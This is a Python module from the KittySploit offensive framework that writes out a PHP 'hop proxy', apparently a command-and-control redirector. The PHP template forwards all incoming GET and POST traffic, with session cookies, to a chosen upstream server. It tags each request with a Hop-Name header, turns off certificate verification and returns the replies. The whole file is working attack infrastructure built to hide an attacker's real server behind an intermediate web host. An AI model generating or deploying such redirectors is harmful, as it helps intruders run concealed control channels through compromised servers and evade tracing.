#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

PHP_PROXY_TEMPLATE = r"""<?php

$server = rtrim("REPLACE_SERVER", '/');
$hopName = "REPLACE_HOP_NAME";


function do_get_request($url, $optionalHeaders = null)
{
  global $hopName;
  $aContext = array(
    'http' => array(
      'method' => 'GET'
    ),
    'ssl'=>array(
      "verify_peer"=>false,
      "verify_peer_name"=>false,
    ),
  );
  $headers = array('Hop-Name' => $hopName);
  if ($optionalHeaders !== null) {
    $headers['Cookie'] = $optionalHeaders;
  }
  $aContext['http']['header'] = prepareHeaders($headers);
  $cxContext = stream_context_create($aContext);
  echo file_get_contents($url, False, $cxContext);
}


function do_post_request($url, $data, $optionalHeaders = null)
{
  global $hopName;
  $params = array(
    'http' => array(
      'method' => 'POST',
      'content' => $data
    ),
    'ssl'=>array(
      'verify_peer'=>false,
      'verify_peer_name'=>false,
    ),
  );
  $headers = array('Hop-Name' => $hopName);
  if ($optionalHeaders !== null) {
    $headers['Cookie'] = $optionalHeaders;
  }
  $params['http']['header'] = prepareHeaders($headers);
  $ctx = stream_context_create($params);
  $fp = @fopen($url, 'rb', false, $ctx);
  if (!$fp) {
    return '';
  }
  $response = @stream_get_contents($fp);
  if ($response === false) {
    return '';
  }
  echo $response;
}

function prepareHeaders($headers) {
  $flattened = array();

  foreach ($headers as $key => $header) {
    if (is_int($key)) {
      $flattened[] = $header;
    } else {
      $flattened[] = $key.': '.$header;
    }
  }

  return implode("\r\n", $flattened);
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $requestURI = $_SERVER['REQUEST_URI'];
  if(isset($_COOKIE['session'])) {
    return do_get_request($server.$requestURI, "session=".str_replace(' ', '+', $_COOKIE['session']));
  }
  else {
    return do_get_request($server.$requestURI);
  }
}

else {
  // otherwise it's a POST
  $requestURI = $_SERVER['REQUEST_URI'];
  $postdata = file_get_contents("php://input");

  if(isset($_COOKIE['session'])) {
    return do_post_request($server.$requestURI, $postdata, "session=".str_replace(' ', '+', $_COOKIE['session']));
  }
  else {
    return do_post_request($server.$requestURI, $postdata);
  }
}

?>"""


class Module(Auxiliary):
    __info__ = {
        "name": "Hop proxy PHP generator",
        "description": (
            "Generates a standalone PHP hop proxy with custom upstream server and Hop-Name value."
        ),
        "author": "KittySploit Team",
        "tags": ["auxiliary", "php", "proxy", "hop", "generator"],
    }

    server = OptString("", "Upstream server URL (REPLACE_SERVER)", required=True)
    hop_name = OptString("hop-default", "Hop-Name header value (REPLACE_HOP_NAME)", required=True)
    output_file = OptString("hop_proxy.php", "Output file path", required=True)
    print_only = OptBool(False, "Print rendered PHP only (do not write file)", required=False)

    def _render_php(self) -> str:
        return (
            PHP_PROXY_TEMPLATE.replace("REPLACE_SERVER", self.server.strip())
            .replace("REPLACE_HOP_NAME", self.hop_name.strip())
        )

    def run(self):
        if not str(self.server).strip().startswith(("http://", "https://")):
            print_error("server must start with http:// or https://")
            return False

        rendered = self._render_php()
        if self.print_only:
            print_info("Rendered PHP proxy:")
            print(rendered)
            return True

        try:
            with open(self.output_file, "w", encoding="utf-8") as fd:
                fd.write(rendered)
            print_success(f"PHP proxy generated: {self.output_file}")
            return True
        except Exception as e:
            print_error(f"Failed to write file: {e}")
            return False
